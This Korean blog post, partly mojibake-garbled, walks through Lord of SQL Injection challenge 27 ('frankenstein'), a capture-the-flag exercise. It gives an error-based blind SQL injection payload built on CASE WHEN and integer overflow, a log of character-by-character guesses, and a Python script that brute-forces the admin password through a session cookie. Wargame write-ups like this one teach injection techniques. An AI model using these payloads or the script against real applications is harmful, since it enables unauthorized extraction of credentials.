---
title: "[LOS] 27ë²ˆ ë¬¸ì œ í’€ì´(frankenstein)"
categories:
  - los
tags:
  - los
  - rubiya
  - los 27ë²ˆ
  - los frankenstein
  
toc: true
toc_sticky: true
toc_label: "27ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/sql.png
---

ğŸ’¡ los.rubiya.kr 27ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤. 
{: .notice--warning}


# 27ë²ˆ(frankenstein)
## ë¬¸ì œ
![image](https://user-images.githubusercontent.com/33647663/160069678-f1c87fb5-bd4a-4417-bdc2-f1cbe3455ac5.png)

## í’€ì´
ì½”ë“œë¥¼ ë³´ë©´ ì—ëŸ¬ê°€ ë°œìƒí•˜ë©´ error í™”ë©´ì„ ë„ìš°ê³ , ì •ìƒì ìœ¼ë¡œ ì¿¼ë¦¬ê°€ ì‹¤í–‰ëœë‹¤ë©´ í•´ë‹¹ í™”ë©´ì´ ë‹¤ì‹œ ê·¸ëŒ€ë¡œ ì¶œë ¥ë©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/160076422-e8c3040d-40db-43a5-938c-b814ba1e8e25.png)

ë”°ë¼ì„œ flow control ê¸°ëŠ¥ì´ ìˆëŠ” if, case ë“±ì„ ì´ìš©í•´ì„œ 

1. ì°¸ì¸ê²½ìš° -> error
2. ê±°ì§“ì¸ ê²½ìš° -> ì •ìƒ ì¿¼ë¦¬

ê°€ ë‚˜ì˜¤ë„ë¡ ìœ ë„í•˜ì—¬, ì¡°ê±´ë¬¸ì˜ ì°¸ ê±°ì§“ì˜ ë¹„êµë¥¼ í†µí•´ì„œ blind sql injectionì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

ì´ì œ ë¬¸ì œëŠ” ì–´ë– í•œ ë°©ì‹ìœ¼ë¡œ flow controlì„ í•˜ëƒì¸ë°, ì œê°€ ì•„ëŠ” ë°©ë²•ì€ 3ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤.
```md
1. if(ì¡°ê±´ë¬¸, error ë°œìƒ,'false' )
  -> ì¡°ê±´ë¬¸ì´ 'ì°¸'ì¼ë•Œ ì—ëŸ¬ë¥¼ ë°œìƒì‹œí‚¤ê³ , ê±°ì§“ì¼ë•ŒëŠ” ì—ëŸ¬ë¥¼ ë°œìƒ ì‹œí‚¤ì§€ ì•ŠìŒ

2. select case when ì¡°ê±´ë¬¸ then **errorë°œìƒ** else 'false' end
  -> ë™ì¼í•˜ê²Œ ì¡°ê±´ë¬¸ì˜ ì°¸ê±°ì§“ì„ ì´ìš© ê°€ëŠ¥

3. select id where id=(select 1 union select 2 where ì¡°ê±´ë¬¸)
  -> ë‹¨ì¼í–‰ ì—°ì‚°ìì¸ '=' ì— ë¹„êµ ëŒ€ìƒì—ì„œ where ì¡°ê±´ì´ 'ì°¸'ì´ ëœë‹¤ë©´ id=(1,2) ê°€ ë˜ì–´ì„œ [ë‹¨ì¼í–‰ = 2ê°œì˜ í–‰] ì˜ ì˜¤ë¥˜ê°€ ë°œìƒí•©ë‹ˆë‹¤.
```
ì´ë²ˆ ë¬¸ì œì—ì„œëŠ” unionê³¼ ê´„í˜¸ê°€ í•„í„°ë§ ë˜ì—ˆìœ¼ë‹ˆ, 2ë²ˆì˜ ë°©ë²•ì„ í†µí•´ì„œ ë¬¸ì œë¥¼ í’€ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

blind sql injectionì— ì‚¬ìš©í•œ í•µì‹¬ í˜ì´ë¡œë“œëŠ” ì•„ë˜ì™€ ê°™ìœ¼ë©° ë¹„ë°€ë²ˆí˜¸ë¥¼ í•œê¸€ìì”© ë¹„êµí•˜ë©´ì„œ ì •ë‹µì„ ì°¾ìŠµë‹ˆë‹¤.

```
#í˜ì´ë¡œë“œ
pw=' or id='admin' and case when pw like '{}%' then 123412341234*123412341234 end#
```

```
' or id='admin' and case when pw like '0%' then 123412341234*123412341234 end#
find the pw 0
' or id='admin' and case when pw like '00%' then 123412341234*123412341234 end#
' or id='admin' and case when pw like '01%' then 123412341234*123412341234 end#
' or id='admin' and case when pw like '02%' then 123412341234*123412341234 end#
' or id='admin' and case when pw like '03%' then 123412341234*123412341234 end#
...

' or id='admin' and case when pw like '0dc4efb9%' then 123412341234*123412341234 end#
' or id='admin' and case when pw like '0dc4efba%' then 123412341234*123412341234 end#
' or id='admin' and case when pw like '0dc4efbb%' then 123412341234*123412341234 end#
find the pw 0dc4efbb

```

ì „ì²´ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```python
import string
import requests

url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"
cookies = {"PHPSESSID" : "595dl7ejl1io50mt9bhg0dbmpk"}
params = {"pw" : None}


domain = string.digits + string.ascii_lowercase

# ë¹„ë°€ë²ˆí˜¸
pw = ''
for i in range(30):
    for j in domain:
        payload = "' or id='admin' and case when pw like '{}%' then 123412341234*123412341234 end#".format(pw+j)
        params["pw"] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        #print(response.text)
        if(response.text.count("error") == 1):
            pw += j
            print("find the pw",pw)
            break
    if(j == domain[-1]):
        print("finish find the pw",pw)
        break
```

pw = 0dc4efbb

![image](https://user-images.githubusercontent.com/33647663/160077551-a9479e1e-b937-4a84-976d-2e73c04abe1f.png)